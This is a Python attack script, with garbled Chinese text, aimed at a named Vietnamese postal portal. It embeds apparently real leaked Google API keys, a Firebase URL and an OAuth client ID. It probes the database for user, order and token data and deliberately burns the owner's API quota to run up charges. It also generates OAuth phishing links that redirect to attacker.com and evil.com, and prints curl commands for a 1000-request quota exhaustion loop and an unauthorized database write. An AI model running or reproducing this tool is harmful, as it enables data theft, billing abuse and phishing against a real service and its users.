#!/usr/bin/env python3
"""
EMS Vietnam Portal - ç¡¬ç¼–ç å¯†é’¥åˆ©ç”¨å·¥å…·
è‡ªåŠ¨æµ‹è¯•å’Œæ»¥ç”¨æ‰€æœ‰å‘çŽ°çš„ç¡¬ç¼–ç å‡­è¯
"""

import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class HardcodedKeyExploit:
    def __init__(self):
        self.google_keys = [
            "AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY",
            "AIzaSyD6C4LdceVok8mCH-4ykyoTLBKHv2hrtbc"
        ]
        self.firebase_url = "https://ems-khl-app-notify.firebaseio.com"
        self.oauth_client = "452955012352-2k6a3t1m77564nui0kq3cbu6nf464kbo.apps.googleusercontent.com"
    
    def print_banner(self):
        print(f"""
{Colors.CYAN}{Colors.BOLD}
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘   EMS Portal - ç¡¬ç¼–ç å¯†é’¥è‡ªåŠ¨åˆ©ç”¨å·¥å…·                â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
{Colors.RESET}
        """)
    
    def test_google_api_keys(self):
        """æµ‹è¯•Google API Keys"""
        print(f"\n{Colors.CYAN}[*] æµ‹è¯•Google API Keys{Colors.RESET}")
        
        google_services = {
            "Maps Geocoding": "https://maps.googleapis.com/maps/api/geocode/json?address=Hanoi,Vietnam",
            "Maps Directions": "https://maps.googleapis.com/maps/api/directions/json?origin=Hanoi&destination=HCMC",
            "Maps Distance Matrix": "https://maps.googleapis.com/maps/api/distancematrix/json?origins=Hanoi&destinations=HCMC",
            "Geolocation": "https://www.googleapis.com/geolocation/v1/geolocate",
            "Places": "https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=21.0285,105.8542&radius=1000",
        }
        
        for i, key in enumerate(self.google_keys, 1):
            print(f"\n  {Colors.YELLOW}[Key {i}] {key[:30]}...{Colors.RESET}")
            
            for service_name, url in google_services.items():
                try:
                    if "geolocation" in url:
                        r = requests.post(f"{url}?key={key}", json={}, timeout=5)
                    else:
                        r = requests.get(f"{url}&key={key}", timeout=5)
                    
                    if r.status_code == 200:
                        data = r.json()
                        
                        if "error" in str(data).lower() or "REQUEST_DENIED" in str(data):
                            status = f"{Colors.RED}âŒ æ‹’ç»{Colors.RESET}"
                            detail = data.get('error_message', data.get('status', ''))
                        elif "results" in data or "status" in data:
                            status = f"{Colors.GREEN}âœ… å¯ç”¨{Colors.RESET}"
                            detail = f"è¿”å›ž {len(str(data))} bytes"
                        else:
                            status = f"{Colors.YELLOW}âš ï¸  æœªçŸ¥{Colors.RESET}"
                            detail = str(data)[:50]
                        
                        print(f"    {status} {service_name:20} - {detail}")
                    else:
                        print(f"    {Colors.RED}âŒ{Colors.RESET} {service_name:20} - HTTP {r.status_code}")
                
                except Exception as e:
                    print(f"    {Colors.RED}âŒ{Colors.RESET} {service_name:20} - {str(e)[:50]}")
    
    def abuse_google_maps_api(self, key, count=10):
        """æ»¥ç”¨Google Maps API"""
        print(f"\n{Colors.CYAN}[*] æ»¥ç”¨Google Maps API (æ¶ˆè€—é…é¢){Colors.RESET}")
        print(f"  å‘é€ {count} ä¸ªè¯·æ±‚...")
        
        success = 0
        for i in range(count):
            try:
                r = requests.get(
                    f"https://maps.googleapis.com/maps/api/geocode/json?address=test{i}&key={key}",
                    timeout=2
                )
                if r.status_code == 200:
                    success += 1
                    sys.stdout.write(f"\r  è¿›åº¦: {i+1}/{count} (æˆåŠŸ: {success})")
                    sys.stdout.flush()
            except:
                pass
        
        print(f"\n  {Colors.GREEN}å®Œæˆ! æˆåŠŸæ¶ˆè€— {success} æ¬¡é…é¢{Colors.RESET}")
        print(f"  {Colors.YELLOW}å¼€å‘è€…å¯èƒ½äº§ç”Ÿé¢å¤–è´¹ç”¨!{Colors.RESET}")
    
    def test_firebase_access(self):
        """æµ‹è¯•Firebaseè®¿é—®"""
        print(f"\n{Colors.CYAN}[*] æµ‹è¯•Firebase Database{Colors.RESET}")
        
        paths = [
            "/.json",
            "/users.json",
            "/orders.json",
            "/notifications.json",
            "/config.json",
            "/merchants.json",
            "/tokens.json",
            "/.settings/rules.json"
        ]
        
        for path in paths:
            try:
                url = self.firebase_url + path
                r = requests.get(url, timeout=3)
                
                if r.status_code == 200:
                    print(f"  {Colors.GREEN}âœ… {path:30} - å¯è¯»å–!{Colors.RESET}")
                    data = r.text[:200]
                    print(f"     æ•°æ®: {data}")
                elif r.status_code == 401:
                    print(f"  {Colors.YELLOW}ðŸ”’ {path:30} - éœ€è¦è®¤è¯{Colors.RESET}")
                elif r.status_code == 403:
                    print(f"  {Colors.YELLOW}ðŸš« {path:30} - æƒé™æ‹’ç»{Colors.RESET}")
                elif r.status_code == 423:
                    print(f"  {Colors.RED}ðŸ” {path:30} - æ•°æ®åº“é”å®š{Colors.RESET}")
                else:
                    print(f"  {Colors.RED}â“ {path:30} - HTTP {r.status_code}{Colors.RESET}")
            
            except Exception as e:
                print(f"  {Colors.RED}âŒ {path:30} - {str(e)[:30]}{Colors.RESET}")
    
    def test_firebase_with_keys(self):
        """ä½¿ç”¨Google Keysæµ‹è¯•Firebase"""
        print(f"\n{Colors.CYAN}[*] ä½¿ç”¨API Keysæµ‹è¯•Firebase{Colors.RESET}")
        
        for i, key in enumerate(self.google_keys, 1):
            print(f"\n  {Colors.YELLOW}[Key {i}]{Colors.RESET}")
            
            for path in ["/.json", "/users.json", "/config.json"]:
                try:
                    url = f"{self.firebase_url}{path}?auth={key}"
                    r = requests.get(url, timeout=3)
                    
                    if r.status_code == 200:
                        print(f"    {Colors.GREEN}âœ… {path:20} - è®¤è¯æˆåŠŸ!{Colors.RESET}")
                        print(f"       æ•°æ®: {r.text[:100]}")
                    else:
                        print(f"    {Colors.RED}âŒ {path:20} - HTTP {r.status_code}{Colors.RESET}")
                except Exception as e:
                    print(f"    {Colors.RED}âŒ {path:20} - {str(e)[:30]}{Colors.RESET}")
    
    def generate_oauth_phishing(self):
        """ç”ŸæˆOAuthé’“é±¼é“¾æŽ¥"""
        print(f"\n{Colors.CYAN}[*] ç”ŸæˆOAuthé’“é±¼é“¾æŽ¥{Colors.RESET}")
        
        scopes = [
            "email profile",
            "email profile openid",
            "https://www.googleapis.com/auth/userinfo.email",
        ]
        
        for scope in scopes:
            url = f"https://accounts.google.com/o/oauth2/v2/auth?client_id={self.oauth_client}&redirect_uri=https://attacker.com/callback&response_type=code&scope={scope}"
            print(f"\n  {Colors.YELLOW}Scope: {scope}{Colors.RESET}")
            print(f"  {Colors.GREEN}URL: {url}{Colors.RESET}")
    
    def generate_exploit_commands(self):
        """ç”Ÿæˆåˆ©ç”¨å‘½ä»¤"""
        print(f"\n{Colors.CYAN}[*] ç”Ÿæˆåˆ©ç”¨å‘½ä»¤{Colors.RESET}")
        
        print(f"""
{Colors.YELLOW}=== Google Maps API æ»¥ç”¨ ==={Colors.RESET}

# å•æ¬¡è°ƒç”¨
curl "https://maps.googleapis.com/maps/api/geocode/json?address=test&key={self.google_keys[0]}"

# æ‰¹é‡æ¶ˆè€—é…é¢
for i in {{1..1000}}; do
  curl "https://maps.googleapis.com/maps/api/geocode/json?address=test$i&key={self.google_keys[0]}" &
done

# æ£€æŸ¥ä½¿ç”¨é‡ (éœ€è¦Projectæƒé™)
# https://console.cloud.google.com/apis/dashboard

{Colors.YELLOW}=== Firebase æ•°æ®çªƒå– ==={Colors.RESET}

# å°è¯•è¯»å–
curl "{self.firebase_url}/.json"
curl "{self.firebase_url}/users.json"

# ä½¿ç”¨API Keyè®¤è¯
curl "{self.firebase_url}/.json?auth={self.google_keys[0]}"

# å°è¯•å†™å…¥ (å¦‚æžœè§„åˆ™å…è®¸)
curl -X PUT "{self.firebase_url}/test.json" -d '{{"hacked":true}}'

{Colors.YELLOW}=== OAuth é’“é±¼ ==={Colors.RESET}

# å‘é€ç»™ç›®æ ‡ç”¨æˆ·
https://accounts.google.com/o/oauth2/v2/auth?client_id={self.oauth_client}&redirect_uri=https://evil.com&response_type=code&scope=email

{Colors.YELLOW}=== æ£€æŸ¥Keyæƒé™ ==={Colors.RESET}

# Google APIs Explorer
https://developers.google.com/oauthplayground/

# æ‰‹åŠ¨æµ‹è¯•å„ä¸ªæœåŠ¡
curl "https://translation.googleapis.com/language/translate/v2?key={self.google_keys[0]}"
curl "https://fcm.googleapis.com/fcm/send" -H "Authorization: key={self.google_keys[0]}"
        """)
    
    def comprehensive_test(self):
        """ç»¼åˆæµ‹è¯•æ‰€æœ‰å¯†é’¥"""
        self.print_banner()
        
        print(f"{Colors.BOLD}å‘çŽ°çš„ç¡¬ç¼–ç å‡­è¯:{Colors.RESET}")
        print(f"  â€¢ Google API Key 1: {self.google_keys[0]}")
        print(f"  â€¢ Google API Key 2: {self.google_keys[1]}")
        print(f"  â€¢ Firebase URL: {self.firebase_url}")
        print(f"  â€¢ OAuth Client ID: {self.oauth_client}")
        
        # æµ‹è¯•Google Keys
        self.test_google_api_keys()
        
        # æµ‹è¯•Firebase
        self.test_firebase_access()
        self.test_firebase_with_keys()
        
        # ç”ŸæˆOAuthé’“é±¼
        self.generate_oauth_phishing()
        
        # æ»¥ç”¨æ¼”ç¤º (é»˜è®¤å°‘é‡)
        print(f"\n{Colors.YELLOW}[!] æ˜¯å¦æ»¥ç”¨APIæ¶ˆè€—é…é¢? (y/N){Colors.RESET}")
        choice = input("  > ").lower()
        if choice == 'y':
            count = int(input("  è¯·è¾“å…¥è¯·æ±‚æ¬¡æ•° (å»ºè®®<100): ") or "10")
            self.abuse_google_maps_api(self.google_keys[0], count)
        
        # ç”Ÿæˆåˆ©ç”¨å‘½ä»¤
        self.generate_exploit_commands()
        
        print(f"\n{Colors.GREEN}[âœ“] æµ‹è¯•å®Œæˆ!{Colors.RESET}\n")

def main():
    exploit = HardcodedKeyExploit()
    exploit.comprehensive_test()

if __name__ == '__main__':
    main()
